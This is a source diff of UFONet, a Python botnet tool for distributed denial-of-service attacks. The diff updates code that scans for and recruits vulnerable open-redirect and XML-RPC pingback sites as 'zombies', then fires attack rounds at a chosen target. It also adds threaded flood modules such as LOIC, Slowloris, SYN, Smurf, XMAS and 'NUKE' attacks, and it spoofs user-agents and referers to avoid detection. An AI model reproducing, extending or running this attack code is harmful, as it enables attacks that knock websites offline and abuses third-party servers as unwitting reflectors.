+                    print "\n[Info] [AI] [Control] Return time set [~"+str(zombies_arrival_timing)+"] for [Zombies] is over! -> [Expiring!]"
+                break
+            else:
+                time.sleep(1)
 
     def discard_zombies(self, discarded):
         disc_zombies = 0
-        zombies_list = [self.zombies_file, self.aliens_file, self.droids_file, self.ucavs_file, self.rpcs_file]
+        if self.options.testoffline:
+            zombies_list = [self.zombies_file, self.aliens_file, self.droids_file, self.ucavs_file, self.rpcs_file]
+        else:
+            zombies_list = [self.zombies_file]
+            if not self.options.disablealiens: # add aliens
+                zombies_list.append(self.aliens_file)
+            if not self.options.disabledroids: # add droids
+                zombies_list.append(self.droids_file)
+            if not self.options.disablerpcs: # add rpcs
+                zombies_list.append(self.rpcs_file)
+            if not self.options.disableucavs: # add ucavs
+                zombies_list.append(self.ucavs_file)
         for l in zombies_list:
             f = open(l, "r+")
             d = f.readlines()
@@ -2733,25 +3451,11 @@ class UFONet(object):
 
     def remove_discarded_zombies(self, f, d, discarded, disc_zombies):
         m = []
-        for zombie_disc in discarded:
-            if zombie_disc.endswith(os.linesep):
-                zombie_disc = zombie_disc.replace(os.linesep, "")
-            elif zombie_disc.endswith("\r"):
-                zombie_disc = zombie_disc.replace("\r", "")
-            elif zombie_disc.endswith("\r" + os.linesep):
-                zombie_disc = zombie_disc.replace("\r" + os.linesep, "")
-            for z in d:
-                if z.endswith(os.linesep):
-                    z = z.replace(os.linesep, "")
-                elif z.endswith("\r"):
-                    z = z.replace("\r", "")
-                elif z.endswith("\r" + os.linesep):
-                    z = z.replace("\r" + os.linesep, "")
-                if z == zombie_disc:
-                    disc_zombies = disc_zombies + 1
-                else:
-                    if z not in m and z not in discarded:
-                        m.append(z)
+        for zombie in d:
+           if zombie not in discarded == True:
+               m.append(zombie) # save it
+           else:
+               disc_zombies = disc_zombies + 1
         if not m:
             f.write("")
         else:
@@ -2762,6 +3466,7 @@ class UFONet(object):
     def testing_rpcs(self, rpcs):
         # discover/test XML-RPC Pingback vulnerabilities on webapps (Wordpress, Drupal, PostNuke, b2evolution, 
         # Xoops, PHPGroupWare, TikiWiki, etc...) and update list
+        options = self.options
         if self.options.testall: #testing_all
             print '='*51
         print ("Are 'plasma' reflectors ready? :-) (XML-RPC Check):")
@@ -2775,28 +3480,30 @@ class UFONet(object):
             self.user_agent = random.choice(self.agents).strip() # shuffle user-agent
             headers = {'User-Agent' : self.user_agent, 'Referer' : self.referer} # set fake user-agent and referer
             if rpc.startswith("http://") or rpc.startswith("https://"):
-                print "Searching 'Pingback' on", rpc
+                print "[Info] [X-RPCs] Searching 'Pingback' on", rpc
                 rpc_host = rpc.replace("/xmlrpc.php", "")
                 rpc_vulnerable, rpc_pingback_url = self.search_rpc(rpc_host)
                 if rpc_vulnerable == True: # discover XML-RPC system.listMethods allowed
                     rpc_methods = "<methodCall><methodName>system.listMethods</methodName><params></params></methodCall>"
                     try:
+                        if options.proxy: # set proxy
+                            self.proxy_transport(options.proxy)
                         req = urllib2.Request(rpc_pingback_url, rpc_methods, headers)
                         target_reply = urllib2.urlopen(req, context=self.ctx).read()
                         if self.options.verbose:
-                            print "Reply:", target_reply
+                            print "[Info] [X-RPCs] Reply:", target_reply
                         if "pingback.ping" in target_reply: # XML-RPC pingback.ping method is allowed!
-                            print "\n[Info] It looks VULNERABLE !!! ;-)"
+                            print "\n[Info] [AI] It looks VULNERABLE! ;-)"
                             rpcs_ready.append(rpc_pingback_url) # save XML-RPC path as RPC zombie
                             num_active_rpcs = num_active_rpcs + 1 # add fail to rpcs stats
                         else:
-                            print "\n[Info] It is NOT vulnerable..."
+                            print "\n[Info] [AI] It is NOT vulnerable..."
                             num_failed_rpcs = num_failed_rpcs + 1 # add fail to rpcs stats
                     except:
-                        print "[Error] X-RPC: " + rpc + " -> FAILED (cannot connect!)"
+                        print "[Info] [X-RPCs] " + rpc + " -> FAILED (cannot connect!)"
                         num_failed_rpcs = num_failed_rpcs + 1 # add fail to rpcs stats
                 else:
-                    print "\n[Info] It is NOT vulnerable..."
+                    print "\n[Info] [AI] It is NOT vulnerable..."
                     num_failed_rpcs = num_failed_rpcs + 1 # add fail to rpcs stats
             print '-'*10
         print '='*18
@@ -2807,21 +3514,21 @@ class UFONet(object):
         else:
             # update 'rpcs' list
             if num_active_rpcs == 0:
-                print "\n[Info] - Not any vulnerable 'rpc' active!\n"
-                return #sys.exit(2)
+                print "\n[Info] [X-RPCs] Not any vulnerable 'rpc' active!\n"
+                return
             else:
                 if not self.options.forceyes:
-                    update_reply = raw_input("Want to update your army? (Y/n)")
+                    update_reply = raw_input("[AI] Do you want to update your army? (Y/n)")
                     print '-'*25
                 else:
                     update_reply = "Y"
                 if update_reply == "n" or update_reply == "N":
-                    print "\nBye!\n"
-                    return #sys.exit(2)
+                    print "[AI] "+self.exit_msg+"\n"
+                    return
                 else:
                     self.update_rpcs(rpcs_ready)
                     if not self.options.upload:
-                        print "\n[Info] - Botnet updated! ;-)\n"
+                        print "\n[Info] [AI] Botnet updated! -> ;-)\n"
 
     def testing(self, zombies):
         # test Open Redirect vulnerabilities on webapps and show statistics
@@ -2839,7 +3546,7 @@ class UFONet(object):
             if zombie.startswith("http://") or zombie.startswith("https://"):
                 # send HEAD connection
                 self.head = True
-                reply = self.connect_zombies(zombie)
+                self.connect_zombies(zombie)
         while self.herd.no_more_zombies() == False:
             time.sleep(1)
         for zombie in self.herd.done:
@@ -2850,8 +3557,10 @@ class UFONet(object):
                 self.head = False
                 if code_reply == "200" or code_reply == "302" or code_reply == "301" or code_reply == "401" or code_reply == "403" or code_reply == "405":
                     name_zombie = t.netloc
+                    if name_zombie == "":
+                        name_zombie = zombie
                     print "Zombie:", name_zombie
-                    print "Status: Ok ["+ code_reply + "]"
+                    print "Status: OK ["+ code_reply + "]"
                     num_active_zombies = num_active_zombies + 1
                     active_zombies.append(zombie)
                 elif code_reply == "404":
@@ -2864,7 +3573,7 @@ class UFONet(object):
                     num_failed_zombies = num_failed_zombies + 1
             else:
                 if self.options.verbose:
-                    print "Reply:", "\n\nNothing!!!!!\n"
+                    print "[Info] [Zombies] Reply:", "\n\nNothing!!!!!\n"
                 print "Zombie:", zombie
                 print "Status: Malformed!"
                 num_failed_zombies = num_failed_zombies + 1
@@ -2874,86 +3583,95 @@ class UFONet(object):
         print "OK:", num_active_zombies, "Fail:", num_failed_zombies
         print '='*18 + "\n"
         print '='*22
-        # check url parameter vectors
-        print ("Checking for payloads:")
-        print '='*22
-        print "Trying:", num_active_zombies
-        print '-'*21
-        zombies_ready = []
-        num_waiting_zombies = 0
-        if num_active_zombies == 0:
-            num_disconnected_zombies = num_failed_zombies
-        else:
-            num_disconnected_zombies = 0
-        for zombie in active_zombies:
-            zombie = str(zombie)
-            t = urlparse(zombie)
-            name_zombie = t.netloc
-            self.payload = True
-            try:
-                self.connect_zombies(zombie)
-            except:
-                pass
-            self.payload = False
-        time.sleep(1)
-        while self.herd.no_more_zombies() == False:
-            time.sleep(1)
-        for zombie in self.herd.done:
-            zombie = str(zombie)
-            t = urlparse(zombie)
-            name_zombie = t.netloc
-            payload_zombie = zombie
-            payload_reply = ""
-            print "Vector:", payload_zombie
-            self.payload = True
-            if self.herd.get_result(zombie):
-                payload_reply = self.herd.get_result(zombie)
-            self.payload = False
-            if "https://www.whitehouse.gov" in payload_reply: #Open Redirect reply [requested by all UFONet motherships ;-)]
-                num_waiting_zombies = num_waiting_zombies + 1
-                print "Status:", "Waiting for orders..."
-                zombies_ready.append(zombie)
+        if num_active_zombies > 0:
+            # check url parameter vectors
+            print ("Checking for payloads:")
+            print '='*22
+            print "Trying:", num_active_zombies
+            print '-'*21
+            zombies_ready = []
+            num_waiting_zombies = 0
+            if num_active_zombies == 0:
+                num_disconnected_zombies = num_failed_zombies
             else:
-                num_disconnected_zombies = num_disconnected_zombies + 1
-                print "Status:", "Not ready..."
-            army = army + 1
-            print '-'*10
-        self.herd.reset()
-        print '='*18
-        print "OK:", num_waiting_zombies, "Fail:", num_disconnected_zombies
-        print '='*18 + "\n"
-        # list of 'zombies' ready to attack
-        num_active_zombie = 0
-        for z in zombies_ready:
-            t = urlparse(z)
-            name_zombie = t.netloc
-            num_active_zombie = num_active_zombie + 1
-            if self.options.verbose:
-                print "Zombie [", num_active_zombie, "]:", name_zombie + "\n"
-        if self.options.testall: # testing_all
-            return zombies_ready, num_waiting_zombies, num_disconnected_zombies + num_failed_zombies
+                num_disconnected_zombies = 0
+            for zombie in active_zombies:
+                zombie = str(zombie)
+                t = urlparse(zombie)
+                name_zombie = t.netloc
+                if name_zombie == "":
+                    name_zombie = zombie
+                self.payload = True
+                self.connect_zombies(zombie)
+                self.payload = False
+            while self.herd.no_more_zombies() == False:
+                time.sleep(1)
+            for zombie in self.herd.done:
+                zombie = str(zombie)
+                t = urlparse(zombie)
+                name_zombie = t.netloc
+                if name_zombie == "":
+                    name_zombie = zombie
+                payload_zombie = zombie
+                payload_reply = ""
+                print "Vector:", payload_zombie
+                self.payload = True
+                if self.herd.get_result(zombie):
+                    payload_reply = self.herd.get_result(zombie)
+                self.payload = False
+                if "https://www.whitehouse.gov" in payload_reply: #Open Redirect reply [requested by all UFONet motherships ;-)]
+                    num_waiting_zombies = num_waiting_zombies + 1
+                    print "Status:", "Waiting for orders... ;-)"
+                    zombies_ready.append(zombie)
+                else:
+                    num_disconnected_zombies = num_disconnected_zombies + 1
+                    print "Status:", "Not ready..."
+                army = army + 1
+                print '-'*10
+            self.herd.reset()
+            print '='*18
+            print "OK:", num_waiting_zombies, "Fail:", num_disconnected_zombies
+            print '='*18 + "\n"
+            # list of [Zombies] ready to attack
+            num_active_zombie = 0
+            for z in zombies_ready:
+                t = urlparse(z)
+                name_zombie = t.netloc
+                if name_zombie == "":
+                    name_zombie = z
+                num_active_zombie = num_active_zombie + 1
+                if self.options.verbose:
+                    print "Zombie [", num_active_zombie, "]:", name_zombie + "\n"
+            if self.options.testall: # testing_all
+                return zombies_ready, num_waiting_zombies, num_disconnected_zombies + num_failed_zombies
+            else:
+                print '-'*25 + "\n"
+                print '='*24
+                print "Working [Zombies]:", num_active_zombie
+                print '='*24
+                if not self.options.forceyes:
+                    update_reply = raw_input("\n[AI] Do you want to update your army? (Y/n)")
+                    print '-'*25
+                else:
+                    update_reply = "Y"
+                if update_reply == "n" or update_reply == "N":
+                    print "[AI] "+self.exit_msg+"\n"
+                    return 
+                else:
+                    self.update_zombies(zombies_ready)
+                    if not self.options.upload:
+                        print "\n[Info] [AI] Botnet updated! -> ;-)\n"
+                        self.update_scanner_stats(self.scanned_zombies) # update json file with scanner stats (found via dorking)
         else:
             print '-'*25 + "\n"
             print '='*24
-            print "Working 'zombies':", num_active_zombie
+            print "Working [Zombies]:", num_active_zombies
             print '='*24
-            if not self.options.forceyes:
-                update_reply = raw_input("\nWant to update your army? (Y/n)")
-                print '-'*25
-            else:
-                update_reply = "Y"
-            if update_reply == "n" or update_reply == "N":
-                print "\nBye!\n"
-                return #sys.exit(2)
-            else:
-                self.update_zombies(zombies_ready)
-                if not self.options.upload:
-                    print "\n[Info] - Botnet updated! ;-)\n"
-                    self.update_scanner_stats(self.scanned_zombies) # update json file with scanner stats (found via dorking)
+            print "\n[Info] [AI] [Zombies] aren't replying to your HEAD check! -> [Exiting!]\n"
 
     def testing_all(self):
         # test whole botnet
-        print ("\nChecking if ALL your zombies are still infected (WARNING: this may take serveral time!)\n")
+        print ("\nChecking if [Zombies] are still infected (WARNING: this may take serveral time!)\n")
         print '='*35
         zombies = self.extract_zombies()
         rpcs = self.extract_rpcs()
@@ -2976,26 +3694,25 @@ class UFONet(object):
         print '='*52 + '\n'
         if num_disconnected_zombies > 0 or num_failed_rpcs > 0:
             if not self.options.forceyes:
-                update_reply = raw_input("Want to update your army? (Y/n)")
+                update_reply = raw_input("[AI] Do you want update your army? (Y/n)")
                 print '-'*25
             else:
                 update_reply = "Y"
             if update_reply == "n" or update_reply == "N":
-                print "\nBye!\n"
-                return #sys.exit(2)
+                print "[AI] "+self.exit_msg+"\n"
+                return
             else:
                 if num_disconnected_zombies > 0:
                     self.update_zombies(zombies_ready)
                 if num_failed_rpcs > 0:
                     self.update_rpcs(rpcs_ready)
                 if not self.options.upload:
-                    print "\n[Info] - Botnet updated! ;-)\n"
+                    print "\n[Info] [AI] Botnet updated! -> ;-)\n"
         else:
-            print "[Info] ALL tested 'zombies' are working... Exiting!\n"
+            print "[Info] [AI] [Control] ALL tested [Zombies] are working! ;-) -> [Exiting!]\n"
 
-    def attacking(self, zombies):
-        # perform a DDoS Web attack against a target, using Open Redirect vectors (and other Web Abuse services) as 'zombies'
-        target = self.options.target
+    def attacking(self, zombies, target):
+        # perform a DDoS Web attack using Open Redirect vectors (and other Web Abuse services) as [Zombies]
         if self.options.forcessl:
             if target.startswith("http://"):
                 target = target.replace("http://", "https://") # force SSL/TLS 
@@ -3005,9 +3722,9 @@ class UFONet(object):
             # send Open Redirect injection (multiple zombies > one target url)
             reply = self.injection(target, zombies)
         else:
-            print "\n[Error] - Target url not valid! -> It should starts with 'http(s)://'\n"
+            print "\n[Error] [AI] Target not valid: "+target+" -> [Discarding!]\n"
 
-    def aiming_extra_weapons(self, target, proxy, loic, loris, ufosyn):
+    def aiming_extra_weapons(self, target, proxy, loic, loris, ufosyn, spray, smurf, xmas, nuke, tachyon):
         # perform some other extra attacks (such as DoS techniques)
         time.sleep(2) # aiming (multi-threading flow time compensation)
         if loic:
@@ -3019,9 +3736,9 @@ class UFONet(object):
                 self.options.loic = 100
             self.instance = LOIC() # instance main class for LOIC operations
             t = threading.Thread(target=self.instance.attacking, args=(target, self.options.loic, proxy)) # LOIC using threads + proxy
-            t.daemon = True
+            t.daemon = True # extra weapons are threaded as daemons
             t.start()
-            self.update_loic_stats() # add new LOIC attack to mothership
+            self.update_loic_stats() # add new LOIC attack to mothership stats
         if loris:
             try:
                 self.options.loris = int(loris)
@@ -3033,7 +3750,7 @@ class UFONet(object):
             t2 = threading.Thread(target=self.instance.attacking, args=(target, self.options.loris)) # LORIS using threads
             t2.daemon = True
             t2.start()
-            self.update_loris_stats() # add new LORIS attack to mothership
+            self.update_loris_stats() # add new LORIS attack to mothership stats
         if ufosyn:
             try:
                 self.options.ufosyn = int(ufosyn)
@@ -3045,10 +3762,74 @@ class UFONet(object):
             t3 = threading.Thread(target=self.instance.attacking, args=(target, self.options.ufosyn)) # UFOSYN using threads
             t3.daemon = True
             t3.start()
-            self.update_ufosyn_stats() # add new UFOSYN attack to mothership
+            self.update_ufosyn_stats() # add new UFOSYN attack to mothership stats
+        if spray:
+            try:
+                self.options.spray = int(spray)
+            except:
+                self.options.spray = 100 # default SPRAY requests
+            if self.options.spray < 1:
+                self.options.spray = 100
+            self.instance = SPRAY() # instance main class for SPRAY operations
+            t4 = threading.Thread(target=self.instance.attacking, args=(target, self.options.spray)) # SPRAY using threads
+            t4.daemon = True
+            t4.start()
+            self.update_spray_stats() # add new SPRAY attack to mothership stats
+        if smurf:
+            try:
+                self.options.smurf = int(smurf)
+            except:
+                self.options.smurf = 101 # default SMURF requests
+            if self.options.smurf < 1:
+                self.options.smurf = 101
+            self.instance = SMURF() # instance main class for SMURF operations
+            t5 = threading.Thread(target=self.instance.attacking, args=(target, self.options.smurf)) # SMURF using threads
+            t5.daemon = True
+            t5.start()
+            self.update_smurf_stats() # add new SMURF attack to mothership stats
+        if xmas:
+            try:
+                self.options.xmas = int(xmas)
+            except:
+                self.options.xmas = 101 # default XMAS requests
+            if self.options.xmas < 1:
+                self.options.xmas = 101
+            self.instance = XMAS() # instance main class for XMAS operations
+            t6 = threading.Thread(target=self.instance.attacking, args=(target, self.options.xmas)) # XMAS using threads
+            t6.daemon = True
+            t6.start()
+            self.update_xmas_stats() # add new XMAS attack to mothership stats
+        if nuke:
+            if sys.platform == "linux" or sys.platform == "linux2":
+                try:
+                    self.options.nuke = int(nuke)
+                except:
+                    self.options.nuke = 10000 # default NUKE requests
+                if self.options.nuke < 1:
+                    self.options.nuke = 10000
+                self.instance = NUKE() # instance main class for NUKE operations
+                t7 = threading.Thread(target=self.instance.attacking, args=(target, self.options.nuke)) # NUKE using threads
+                t7.daemon = True # extra weapons are threaded as daemons
+                t7.start()
+                self.update_nuke_stats() # add new NUKE attack to mothership stats
+            else:
+                print "\n[Info] [AI] Your OS cannot perform this attack... -> [Passing!]\n"
+        if tachyon:
+            try:
+                self.options.tachyon = int(tachyon)
+            except:
+                self.options.tachyon = 1000 # default TACHYON requests
+            if self.options.tachyon < 1:
+                self.options.tachyon = 1000
+            self.instance = TACHYON() # instance main class for TACHYON operations
+            t8 = threading.Thread(target=self.instance.attacking, args=(target, self.options.tachyon)) # TACHYON using threads
+            t8.daemon = True
+            t8.start()
+            self.update_tachyon_stats() # add new TACHYON attack to mothership stats
 
     def stressing(self, target, zombie):
         # perform a DDoS Web attack against a target, requesting records on target's database
+        options = self.options
         db_input = self.options.dbstress
         def random_key(length):
             key = ''
@@ -3063,32 +3844,34 @@ class UFONet(object):
             length = 1 # search for one different (alphanumeric) character each time will produces more positive results on db
         key = str(random_key(length))
         if self.db_flash > 9:
-            print "\n[Info] Trying database request to: " + db_input + " | Query used: db flash! " + "(" + str(length) + " chars)"
+            print "\n[Info] [DBStress] Trying database request to: " + db_input + " | Query used: db flash! " + "(" + str(length) + " chars)"
         else:
-            print "\n[Info] Trying database request to: " + db_input + " | Query used: " + key
+            print "\n[Info] [DBStress] Trying database request to: " + db_input + " | Query used: " + key
         self.user_agent = random.choice(self.agents).strip() # shuffle user-agent
         headers = {'User-Agent' : self.user_agent, 'Referer' : self.referer} # set fake user-agent and referer
         if not target.endswith('/'): # add "/" to end of target
             target = target + "/"
         url = zombie + target + db_input + key
         req = urllib2.Request(url, None, headers)
+        if options.proxy: # set proxy
+            self.proxy_transport(options.proxy)
         try:
-            req_reply = urllib2.urlopen(req).read()
+            req_reply = urllib2.urlopen(req, context=self.ctx).read()
         except urllib2.HTTPError, e:
             if e.code == 401:
-                print '[Info] Not authorized'
+                print '[Info] [DBStress] Not authorized'
             elif e.code == 404:
-                print '[Info] Not found'
+                print '[Info] [DBStress] Not found'
             elif e.code == 503:
-                print '[Info] Service unavailable'
+                print '[Info] [DBStress] Service unavailable'
             else:
-                print '[Info] Unknown error'
+                print '[Info] [DBStress] Unknown error'
         else:
-            print '[Info] DB query: Hit!'
+            print '[Info] [DBStress] Database query: HIT!'
 
     def attackme(self, zombies):
         # perform a DDoS Web attack against yourself
-        print "Starting local port to listening at: " + self.port + "\n" 
+        print "[AI] Starting local port to listening at: " + self.port + "\n" 
         print '='*21 + "\n"
         self.doll=Doll(self)
         self.doll.start()
@@ -3101,77 +3884,115 @@ class UFONet(object):
         self.doll.join()
         self.herd.list_fails()
 
-    def injection(self, target, zombies, head_check = True):
+    def check_target_status(self):
+        if self.num_is_down > 0 and self.num_is_up == 0: # check for: 1 or more down, 0 up
+            print "\n[Info] [AI] Congratulations!! -> [Target looks OFFLINE!]\n"
+            if not self.options.forceyes:
+                update_reply = raw_input("[AI] Do you want to send a [HEAD] check request? (y/N)")
+                print "\n" + '-'*25
+            else:
+                update_reply = "N"
+            if update_reply == "y" or update_reply == "Y":
+                try: # send HEAD connection
+                    self.head = True
+                    reply = self.connect_zombie(target)
+                    self.head = False
+                    if reply:
+                        print "\n[Info] [AI] [Control] Target has replied you! -> [Keep shooting!]\n"
+                    else:
+                        print "\n[Info] [AI] " + target + " -> [TANGO DOWN!!!]\n"
+                        self.update_targets_crashed() # update targets crashed stats
+                        self.update_mothership_stats() # update mothership completed attack stats
+                except Exception:
+                    print "\n[Error] [AI] Something wrong with your connection!...\n"
+                    if self.options.verbose:
+                        traceback.print_exc()
+                return
+            else:
+                print "\n[Info] [AI] " + target + " -> [TANGO DOWN!!!]\n"
+                self.update_targets_crashed() # update targets crashed stats
+                self.update_mothership_stats() # update mothership completed attack stats
+                return
+
+    def starting_target_check(self, target, head_check):
         options = self.options
         head_check_here = False
         head_check_external = False
-        print '='*22
         if options.disablehead: # check at start is disabled (skipping!)
-            print "\n[Info] Skipping external check of target's status...\n"
+            print "[Info] [AI] Skipping external check...\n"
             head_check_here = True
             head_check_external = True
         else:
             if head_check:
                 if not options.attackme:
-                    print "Round: 'Is target up?'"
-                    print '='*22
+                    print "[AI] Launching: 'Is target up?' check...\n"
                     try: # send HEAD connection
                         self.head = True
                         reply = self.connect_zombie(target)
                         self.head = False
                         if reply:
-                            print "[Info] From here: YES"
+                            print "[Info] [AI] [Control] From YOU: YES -> ["+str(reply)+"-OK]"
                             head_check_here = True
                         else:
-                            print "[Error] From here: NO | Report: From your network your target looks DOWN!..."
+                            print "[Info] [AI] [Control] From YOU: NO -> [Target looks OFFLINE!]"
                             head_check_here = False
                     except Exception:
-                        print "[Error] From here: NO | Report: Cannot reach your target from your network..."
+                        print "[Error] [AI] [Control] From YOU: NO -> [Cannot connect!]"
                         if self.options.verbose:
                             traceback.print_exc()
                         head_check_here = False
                 else: # check if local IP/PORT is listening on mothership
-                    print "Round: 'Is NAT ready?'"
-                    print '='*21
+                    print "[AI] Launching: 'Is NAT ready?' check...\n"
                     try:
                         sock = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
                         result = sock.connect_ex(('0.0.0.0',8080))
                         if result == 0 or result == 110: # black magic
-                            print "[Info] Local port: YES | Report: Mothership accesible on -private- IP: http://0.0.0.0:8080"
+                            print "[Info] [AI] [Control] Local port: YES | Mothership accesible from -private- IP: http://0.0.0.0:8080"
                             head_check_here = True
                         else:
-                            print "[Error] Local port: NO | Report: Something wrong on your port: 8080"
+                            print "[Info] [AI] [Control] Local port: NO | Something goes wrong with your port: 8080"
                             head_check_here = False
                     except Exception:
-                        print "[Error] Local port: NO | Report: Something wrong checking open port ;("
+                        print "[Error] [AI] [Control] Local port: NO | Something wrong checking for open ports..."
                         if self.options.verbose:
                             traceback.print_exc()
                         head_check_here = False
-                print '-'*21
             else:
                 head_check_here = True
-            # check target on third part service
+            # check target using external check services
             self.external = True
             if not options.attackme:
                 try:
-                    external_reply = self.connect_zombie(target)
-                    if "It's just you" in external_reply: # parse from external service: http://www.downforeveryoneorjustme.com
-                        print "[Info] From exterior: YES"
+                    url = self.external_check_service1 + target # check from external service [1]
+                    self.user_agent = random.choice(self.agents).strip() # shuffle user-agent
+                    headers = {'User-Agent' : self.user_agent, 'Referer' : self.referer} # set fake user-agent and referer
+                    if options.proxy: # set proxy
+                        self.proxy_transport(options.proxy)
+                    req = urllib2.Request(url, None, headers)
+                    external_reply = urllib2.urlopen(req, context=self.ctx).read()
+                    if "It's just you" in external_reply:
+                        t = urlparse(self.external_check_service1)
+                        name_external1 = t.netloc
+                        print "[Info] [AI] [Control] From OTHERS: YES -> ["+name_external1+"]"
                         head_check_external = True
-                    else: # parse from external service: http://isup.me [29/08/2018 -> DEPRECATED!] | https://status.ws/
-                        url = "https://status.ws/" + target
+                    else: 
+                        url = self.external_check_service2 + target # check from external service [2]
                         self.user_agent = random.choice(self.agents).strip() # shuffle user-agent
                         headers = {'User-Agent' : self.user_agent, 'Referer' : self.referer} # set fake user-agent and referer
+                        if options.proxy: # set proxy
+                            self.proxy_transport(options.proxy)
                         req = urllib2.Request(url, None, headers)
-                        req_reply = urllib2.urlopen(req).read()
-                        if 'may be just down for you' in req_reply: # parse external service for reply
-                            print "[Info] From exterior: YES"
+                        req_reply = urllib2.urlopen(req, context=self.ctx).read()
+                        if 'returned code 200 OK and is up' in req_reply:
+                            t = urlparse(self.external_check_service2)
+                            name_external2 = t.netloc
+                            print "[Info] [AI] [Control] From OTHERS: YES -> ["+name_external2+"]"
                             head_check_external = True
                         else:
-                            print "[Error] From exterior: NO | Report: From external services your target looks DOWN!"
+                            print "[Info] [AI] [Control] From OTHERS: NO -> [Target looks OFFLINE!]"
                             head_check_external = False
                 except Exception:
-                        print "[Error] From exterior: NO | Report: Cannot reach external services from your network..."
+                        print "[Error] [AI] [Control] From OTHERS: NO -> [Cannot connect!]"
                         head_check_external = False
             else:
                 try: # check mothership from public ip / NAT using HEAD request
@@ -3182,33 +4003,38 @@ class UFONet(object):
                     except Exception:
                         reply = None
                     if reply:
-                        print "[Info] From exterior: YES | Report: Mothership accesible from the Internet ;-) ["+str(self.pub_ip)+":8080]"
+                        print "[Info] [AI] [Control] From OTHERS: YES -> [Mothership OK!] -> ["+str(self.pub_ip)+":8080]"
                         head_check_external = True
                     else:
-                        print "[Error] From exterior: NO | Report: Cannot access to the mothership using a public IP. Your NAT configuration is not working correctly:", target
+                        print "[Info] [AI] [Control] From OTHERS: NO -> [Cannot connect!] -> [NAT is failing!]"
                         head_check_external = False
                         head_check_here = False # stop attack if not public IP available
                 except Exception:
-                    print "[Error] From exterior: NO | Report: Check failed from your connection..."
+                    print "[Error] [AI] [Control] From OTHERS: NO -> [Check failed!]"
                     head_check_here = False # stop attack if not public IP available
                     if self.options.verbose:
                         traceback.print_exc()
                     head_check_external = False
-            print '-'*21 + "\n"
             self.external = False
-        # ask for start the attack
+        return head_check_here, head_check_external
+
+    def injection(self, target, zombies, head_check = True):
+        options = self.options
+        # check target's integrity at start
+        head_check_here, head_check_external = self.starting_target_check(target, head_check)
+        # ask user to confirm the attack
         if head_check_here == True or head_check_external == True:
             if not self.options.forceyes: 
                 if not options.attackme:
                     if not options.disablehead:
-                        start_reply = raw_input("[Info] Your target looks ONLINE!. Want to start a DDoS attack? (y/N)\n")
+                        start_reply = raw_input("\n[AI] Target is ONLINE!. Do you want to start an attack? (y/N)\n")
                     else:
-                        start_reply = raw_input("[Info] Want to start a DDoS attack directly? (y/N)\n")
+                        start_reply = raw_input("\n[AI] Do you want to start an attack, directly? (y/N)\n")
                 else:
                     if not options.disablehead:
-                        start_reply = raw_input("[Info] Your mothership looks READY!. Want to start a DDoS attack against yourself? (y/N)\n")
+                        start_reply = raw_input("\n[AI] Mothership is READY!. Do you want to start an attack 'against yourself'? (y/N)\n")
                     else:
-                        start_reply = raw_input("[Info] Want to start a DDoS attack against yourself directly? (y/N)\n")
+                        start_reply = raw_input("\n[AI] Do you want to start an attack 'against yourself', directly? (y/N)\n")
             else:
                 start_reply = "Y"
             if start_reply == "y" or start_reply == "Y":
@@ -3222,92 +4048,207 @@ class UFONet(object):
                 num_round = 1
                 num_hits = 0
                 num_zombie = 1
-                t = threading.Thread(target=self.aiming_extra_weapons, args=(target, self.options.proxy, self.options.loic, self.options.loris, self.options.ufosyn)) # multithreading flow for extra attacks
-                t.daemon = True
-                t.start()
-                # start to attack the target with each zombie
+                # start to attack the target with [MODS]
+                if options.loic or options.loris or options.ufosyn or options.spray or options.smurf or options.xmas or options.nuke or options.tachyon:
+                    ex = threading.Thread(target=self.aiming_extra_weapons, args=(target, self.options.proxy, self.options.loic, self.options.loris, self.options.ufosyn, self.options.spray, self.options.smurf, self.options.xmas, self.options.nuke, self.options.tachyon)) # multithreading flow for extra attacks
+                    ex.daemon = True # extra weapons are threaded as daemons
+                    ex.start()
+                # start to attack the target with [ARMY]
                 zombies = self.extract_zombies() # extract zombies from file
-                total_zombie = len(zombies)
+                if zombies:
+                    self.total_zombie = len(zombies)
+                else:
+                    self.total_zombie = 0
+                    return
                 self.herd=Herd(self)
-                for i in range(0, int(total_rounds)):
+                if not self.options.disablepurge:
+                    self.discardzombies = []
+                    self.discard_aliens = []
+                    self.discard_droids = []
+                    self.discard_rpcs = []
+                    self.discard_ucavs = []
+                    total_disc_zombies = 0
+                    self.num_discard_zombies = 0
+                    self.num_discard_aliens = 0
+                    self.num_discard_droids = 0
+                    self.num_discard_rpcs = 0
+                    self.num_discard_ucavs = 0
+                    self.empty_zombies = False
+                for i in range(0, int(total_rounds)): # start attacking using rounds
                     print ("\x1b[2J\x1b[H")# clear screen (black magic)
                     print '='*42
                     print 'Starting round:', num_round, ' of ', total_rounds
                     print '='*42
-                    if not self.options.disablealiens and not self.options.attackme: # different layers requests -> pure web abuse 
-                        send_aliens = self.send_aliens(target)
-                    if not self.options.disabledroids and not self.options.attackme: # GET (with parameter required) requests 
-                        send_droids = self.send_droids(target)
-                    if not self.options.disablerpcs and not self.options.attackme: # exploit XML-RPC pingback vulnerability 
-                        send_rpcs = self.send_rpcs(target)
-                    shuffle(zombies) # shuffle zombies order, each round :-)
                     self.herd.reset()
-                    print "\n[Info] Sending your 'herd' of zombies...\n"
-                    for zombie in zombies:
-                        t = urlparse(zombie)
-                        name_zombie = t.netloc
-                        if not self.options.attackme:
-                            print "[Info] Attacking from: " + name_zombie
-                        else: # on attackme, target url is dynamic -> http://public_ip:port/hash|zombie
-                            self.mothership_hash = random.getrandbits(128) # generating random evasion hash  
-                            target = "http://" + str(self.pub_ip) + ":" + self.port + "/"+ str(self.mothership_hash) + "|" + zombie
-                            self.options.target = target
-                            print "Attacking: " + str(self.pub_ip) + ":" + self.port + " -> [LAN]" + self.local_ip + ":" + self.port
-                            print "Payload: " + target
-                            print '='*55, "\n"
-                        self.attack_mode = True
-                        self.user_agent = random.choice(self.agents).strip() # shuffle user-agent
-                        if not options.target.startswith('http'):
-                            if options.forcessl:
-                                options.target = "https://" + options.target
+                    self.extra_zombies_lock = True
+                    self.total_zombies_failed_connection = 0 # reset failed [Zombies] connection counter each round
+                    self.send_zombies(zombies) # send [Zombies]
+                    if not self.options.attackme:
+                        if not self.options.disablealiens or not self.options.disabledroids or not self.options.disablerpcs or not self.options.disableucavs:
+                            if self.options.verbose:
+                                print "[Info] [AI] [Control] All [Zombies] have returned for this round... -> [Waiting!]"
+                            self.send_extra_zombies() # send [ARMY]
+                            while self.extra_zombies_lock == True:
+                                time.sleep(1) # wait for [ARMY] to return
+                            if self.options.verbose:
+                                print "\n" + '='*42
